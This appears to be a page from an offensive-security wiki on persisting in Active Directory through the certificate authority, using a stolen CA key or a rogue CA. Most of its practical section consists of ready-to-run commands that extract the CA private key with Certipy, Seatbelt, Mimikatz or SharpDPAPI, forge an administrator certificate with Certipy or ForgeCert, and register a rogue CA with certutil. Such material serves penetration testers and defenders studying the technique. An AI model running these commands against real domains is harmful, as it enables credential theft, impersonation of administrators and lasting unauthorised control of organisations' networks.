---
authors: ShutdownRepo
category: ad
---

# Certificate authority

## Theory

In [their research papers](https://posts.specterops.io/certified-pre-owned-d95910965cd2), [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) identified 2 domain persistence techniques relying on the role of the Certificate Authority within a PKI.

* Forging certificates with a stolen CA certificates (DPERSIST1)
* Trusting rogue CA certificates (DPERSIST2)

## Practice

### Stolen CA

> The Enterprise CA has a certificate and associated private key that exist on the CA server itself. ([Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf))

If an attacker obtains control over a CA server, he may be able to retrieve the private key associated with the CA cert, and use that private key to generate and sign client certificates. This means he could forge (and sign) certificate to authenticate as a powerful user for example.

::: tabs

=== UNIX-like

Extracting the DPAPI-protected CA cert private key can be done remotely from UNIX-like systems with [Certipy](https://github.com/ly4k/Certipy) (Python).


```bash
certipy ca -backup -ca "CA" -username "USER@domain.local" -password "PASSWORD" -dc-ip "DC-IP"
```


Then, forging (and signing) a certificate can be done as follows.


```bash
certipy forge -ca-pfx "CA.pfx" -upn "administrator@corp.local" -subject "CN=Administrator,CN=Users,DC=CORP,DC=LOCAL"
```


The certificate can then be used with [Pass the Certificate](../../movement/kerberos/pass-the-certificate.md).


=== Windows

Extracting the DPAPI-protected CA cert private key can be done remotely with [Seatbelt](https://github.com/GhostPack/Seatbelt) (C#).

```powershell
Seatbelt.exe Certificates -computername="ca.domain.local"
```

Alternatively, the builtin `certsrv.msc` utility can be used locally on the CA server.


```
Win+R > certsrv.msc > CA > right click > All Tasks > Back up CA... > selet "Private key and CA certificate" > Next
```


Alternatively, [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can also be used for that purpose, locally.

```powershell
mimikatz.exe "crypto::capi" "crypto::cng" "crypto::certificates /export"
```

Alternatively, [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) (C#) can be used for that purpose, locally, along with [openssl](https://www.openssl.org/) to transform the PEM into a usable PFX.

```powershell
SharpDPAPI.exe certificates /machine
```


```bash
openssl pkcs12 -in "ca.pem" -keyex -CSP "Microsoft Enhanced
Cryptographic Provider v1.0" -export -out "ca.pfx"
```


Then, forging and signing a certificate can be done with [ForgeCert](https://github.com/GhostPack/ForgeCert) (C#).


```powershell
ForgeCert.exe --CaCertPath "ca.pfx" --CaCertPassword "Password" --Subject "CN=User" --SubjectAltName "administrator@domain.local" --NewCertPath "administrator.pfx" --NewCertPassword "Password"
```


:::


### Rogue CA

> [!WARNING]
> > it is usually preferable for an attacker to steal the existing CA certificate instead of installing an additional rogue CA certificate ([Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf))

An attacker with sufficient privileges in the domain can setup a rogue CA and make the domain's resources trust it. Once the rogue CA is trusted, the attacker can forge and sign client certificates.

In order to register the rogue CA, the self-signed CA cert must be added to the `NTAuthCertificates` object's `cacertificate` attribute, and in the `RootCA` directory services store.

Registering the rogue CA can be done remotely with the `certutil.exe` utility from Windows systems.

```batch
certutil.exe -dspublish -f "C:\Temp\CERT.crt" NTAuthCA
```

Once this is done, a certificate can be forged, signed and used as explained above: [#stolen-ca](certificate-authority.md#stolen-ca)

## Resources

[https://posts.specterops.io/certified-pre-owned-d95910965cd2](https://posts.specterops.io/certified-pre-owned-d95910965cd2)